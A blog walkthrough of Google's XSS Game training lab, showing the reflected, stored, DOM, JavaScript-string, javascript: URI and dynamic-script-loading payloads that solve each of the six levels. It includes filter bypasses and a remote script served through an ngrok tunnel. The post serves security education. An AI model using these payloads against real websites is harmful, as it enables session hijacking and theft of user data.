# Google Appspot XSS CTF Walkthrough 🎯

> **Author**: Aditya Bhatt
> **Published**: Dec 28, 2025

---

## XSS, DOM Manipulation, Input Reflection — A complete step-by-step walkthrough of Google’s XSS Game demonstrating real-world cross-site scripting patterns, payload reasoning, and exploitation across all six levels.

![Aditya Bhatt](https://miro.medium.com/v2/resize:fill:32:32/1*6TFmlC58KtmaRsYHdjy9Qg.jpeg)

7

Listen

Share

Lab Link: https://xss-game.appspot.com/
Platform: Google XSS Game
Vulnerability Class: Cross-Site Scripting (XSS)
Free Article Link

![image](https://miro.medium.com/v2/resize:fit:700/0*iWHwbEm4tjsWVQ0y.png)

## ✅ TL;DR

- XSS is context-dependent, not payload-dependent
- innerHTML and jQuery.html() are dangerous execution sinks
- Filters fail — logic flaws persist
- URL fragments and dynamic script loading are high-risk
- Real exploitation requires reading source, not guessing payloads

## 🔰 Introduction

Cross-Site Scripting (XSS) vulnerabilities remain one of the most commonly exploited weaknesses in modern web applications. Improper handling of user-controlled input allows attackers to execute arbitrary JavaScript in a victim’s browser, potentially leading to session hijacking, data theft, or account compromise.

The Google XSS Game is a deliberately vulnerable training platform designed to teach XSS exploitation from first principles. The lab progresses through six levels, each demonstrating a different real-world XSS pattern.

This article documents a complete step-by-step Proof of Concept (PoC) for all six levels, with screenshots mapped exactly to each step and payload reasoning explained throughout 🧪⚔️

## 🧪 Lab Description

Warning: You are entering the XSS game area
Welcome, recruit!

Cross-site scripting (XSS) bugs are among the most common and dangerous web vulnerabilities. These nasty buggers can allow attackers to steal or modify user data in applications.

Google treats XSS very seriously and has historically paid bounties of up to $7,500 for dangerous XSS bugs.

There will be cake at the end 🍰

![image](https://miro.medium.com/v2/resize:fit:700/0*yk9minEUjXFuhUHp.png)

## 🧩 Level 1 — Hello, World of XSS

Link: https://xss-game.appspot.com/level1
Level: 1/6
Vulnerability Type: Reflected XSS

## Get Aditya Bhatt’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This level demonstrates reflected XSS where user input is directly embedded into the response without proper escaping.

![image](https://miro.medium.com/v2/resize:fit:700/0*PTN2wGgFBBwXtqlS.png)

## 🔎 Reflection Check

Input:

```
Hii
```

Response:

```
Sorry, no results were found for Hii. Try again.
```

URL:

```
https://xss-game.appspot.com/level1/frame?query=Hii
```

The input is reflected unescaped — a clear reflected XSS indicator.

![image](https://miro.medium.com/v2/resize:fit:700/0*8Ett8igtCu2IAhk5.png)

## 🧪 HTML Injection Test

Payload:

```
<h1>Hiii</h1>
```

The HTML renders successfully, confirming lack of sanitization.

![image](https://miro.medium.com/v2/resize:fit:700/0*BdU7PPcGKv0Dss39.png)

## 💥 Final Payload (Level 1)

```
<script>alert("Aditya Bhatt")</script>
```

JavaScript executes successfully.

![image](https://miro.medium.com/v2/resize:fit:700/0*1qQABLIC6E44pYLb.png)

## 🧩 Level 2 — Persistence is Key

Link: https://xss-game.appspot.com/level2
Level: 2/6
Vulnerability Type: Stored XSS (Client-Side Storage)

## 🧪 Initial Payload Attempts

Payloads tested:

```
test
```

```
<script>alert("Aditya Bhatt")</script>
```

- test message is posted
- <script> payload is completely redacted
- No observable changes in the Network tab

This suggests tag-based filtering, not contextual sanitization.

![image](https://miro.medium.com/v2/resize:fit:700/0*n-q7h-tlQo4raaPX.png)

## 🔎 JavaScript Source Code Review

Inspector → Debugger → Sources → level2/frame

```
<!doctype html>
<html>
  <head>
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
    <script src="/static/post-store.js"></script>
  
    <script>
      var defaultMessage = "Welcome!<br><br>This is your <i>personal</i>"
        + " stream. You can post anything you want here, especially "
        + "<span style='color: #f00ba7'>madness</span>.";
      var DB = new PostDB(defaultMessage);
      function displayPosts() {
        var containerEl = document.getElementById("post-container");
        containerEl.innerHTML = "";
        var posts = DB.getPosts();
        for (var i=0; i<posts.length; i++) {
          var html = "<blockquote>" + posts[i].message + "</blockquote>";
          containerEl.innerHTML += html;
        }
      }
```

![image](https://miro.medium.com/v2/resize:fit:700/0*mn1us9iUKQHxRM53.png)

User-controlled input is rendered via innerHTML. Script tags are filtered, but event handlers are not 🗿

## 💥 Final Payload (Level 2)

```
<img src=x onerror=alert()>
```

The onerror handler executes — Level 2 solved.

![image](https://miro.medium.com/v2/resize:fit:700/0*ZQGE2rnWPOKbvZco.png)

## 🧩 Level 3 — That Sinking Feeling…

Link: https://xss-game.appspot.com/level3
Level: 3/6
Vulnerability Type: DOM-Based XSS

![image](https://miro.medium.com/v2/resize:fit:700/0*KMejWqM0b92nYVXl.png)

## 🔎 Parameter Analysis

URL fragment:

```
https://xss-game.appspot.com/level3/frame#1
```

Valid values: 1, 2, 3 Any other input results in Image NaN.

![image](https://miro.medium.com/v2/resize:fit:700/0*yD5f6xII0rjgVe10.png)

## 🔍 Source Code Review

```
function chooseTab(num) {
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);
}
```

The num parameter is concatenated directly into HTML and rendered using jQuery.html() — a DOM XSS sink.

![image](https://miro.medium.com/v2/resize:fit:700/0*PzeQXHzoirm1ANuu.png)

## 🧪 Context Break

Payload:

```
'
```

Malformed output:

```
<img src="/static/cloud/level3/cloud" .jpg'="">
```

![image](https://miro.medium.com/v2/resize:fit:700/0*R4Z-aETFNyozAd_Q.png)

## 💥 Final Payload (Level 3)

```
' onerror=alert() '
```

The malformed image triggers JavaScript execution.

![image](https://miro.medium.com/v2/resize:fit:700/0*kAejynqI4wDfzEqE.png)

## 🧩 Level 4 — Context Matters

Link: https://xss-game.appspot.com/level4
Level: 4/6
Vulnerability Type: JavaScript Context Injection

![image](https://miro.medium.com/v2/resize:fit:700/0*1uLs9Im1qYZroq5e.png)

## 🔎 Response Analysis (Burp)

```
<img src="/static/loading.gif" onload="startTimer('test');" />
<div id="message">Your timer will execute in test seconds.</div>
```

User input is injected inside a JavaScript string context.

![image](https://miro.medium.com/v2/resize:fit:700/0*fhAPfNV2BlcL3dAr.png)

## 🧪 Failed Payload

```
<script>alert(1)</script>
```

Escaped safely.

![image](https://miro.medium.com/v2/resize:fit:700/0*WDpCS_DCYKKQ3lnl.png)

## 💥 Final Payload (Level 4)

```
'); alert('1
```

Breaks out of the string and executes JavaScript.

![image](https://miro.medium.com/v2/resize:fit:700/0*3iw-3UnrI2Wjgto9.png)

## 🧩 Level 5 — Breaking Protocol

Link: https://xss-game.appspot.com/level5
Level: 5/6
Vulnerability Type: JavaScript URI Injection

![image](https://miro.medium.com/v2/resize:fit:700/0*LbSZgnsIcLwXw9q2.png)

## 🔎 Signup Flow & Reflection

```
https://xss-game.appspot.com/level5/frame/signup?next=hii
```

Response:

```
<a href="hii">Next >></a>
```

![image](https://miro.medium.com/v2/resize:fit:700/0*unSIlgn9KFefi0bf.png)

## 🧪 Filter Bypass Attempt

```
hiii" attrib="Neww
```

Filtered, but reflection confirmed.

![image](https://miro.medium.com/v2/resize:fit:700/0*-eJChmdkYWF_qqnf.png)

## 💥 Final Payload (Level 5)

```
javascript:alert()
```

Executes on click.

![image](https://miro.medium.com/v2/resize:fit:700/0*KG0izEzUlSxKS6LV.png)

## 🔁 Extra Observation

Open redirect confirmed:

```
https://xss-game.appspot.com/level5/frame/signup?next=https://adityabhatt3010.netlify.app/
```

![image](https://miro.medium.com/v2/resize:fit:700/0*rQuk9QaeBaEZpYG6.png)

![image](https://miro.medium.com/v2/resize:fit:700/0*yXi19TErMGamFJW5.png)

## 🧩 Level 6 — Follow the 🐇

Link: https://xss-game.appspot.com/level6
Level: 6/6
Vulnerability Type: Dynamic Script Injection

![image](https://miro.medium.com/v2/resize:fit:700/0*OWQM45qLFk3fbuho.png)

## 🔎 Source Code Review

```
function includeGadget(url) {
  if (url.match(/^https?:\/\//)) return;
  var s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
}
```

Anything after # is dynamically loaded.

![image](https://miro.medium.com/v2/resize:fit:700/0*qF4RYU97F4OQjxdb.png)

## 🧪 Hash Injection

```
#hii
```

Loads gadget.

![image](https://miro.medium.com/v2/resize:fit:700/0*V6WrBbJ1gSMyuowg.png)

## 🧪 Malicious Script Setup

```
echo "alert()" > adi.js
python3 -m http.server 80
ngrok http 80
```

![image](https://miro.medium.com/v2/resize:fit:700/0*BkBFB7iZQImmXo9J.png)

## 💥 Final Payload (Level 6)

```
#HTTPS://a45cc0a21617.ngrok-free.app/adi.js
```

Uppercase HTTPS bypasses the filter.

![image](https://miro.medium.com/v2/resize:fit:700/0*1cu3kdT9bsN1Opfm.png)

![image](https://miro.medium.com/v2/resize:fit:700/0*oit57dC7BwCzJ-C7.png)

## 🏁 Conclusion

The Google XSS Game mirrors real-world XSS mistakes still present in production systems. Each level reinforces a critical lesson:

Escaping input is meaningless without understanding execution context.

If you can reason through these six levels, you’re already thinking like an attacker — and that’s exactly how strong defenders are built 🔐⚔️

Happy hacking.

~ Aditya Bhatt

## ⭐ Follow Me & Connect

🔗 GitHub: https://github.com/AdityaBhatt3010
💼 LinkedIn: https://www.linkedin.com/in/adityabhatt3010/
✍️ Medium: https://medium.com/@adityabhatt3010
👨‍💻👩‍💻 GitHub PoC Repository: https://github.com/AdityaBhatt3010/Google-XSS-Game-Walkthrough/



---
*Original URL: [https://medium.com/bugbountywriteup/google-appspot-xss-ctf-walkthrough-1c0f32dfd30a?source=search_post---------113-----------------------------------](https://medium.com/bugbountywriteup/google-appspot-xss-ctf-walkthrough-1c0f32dfd30a?source=search_post---------113-----------------------------------)*
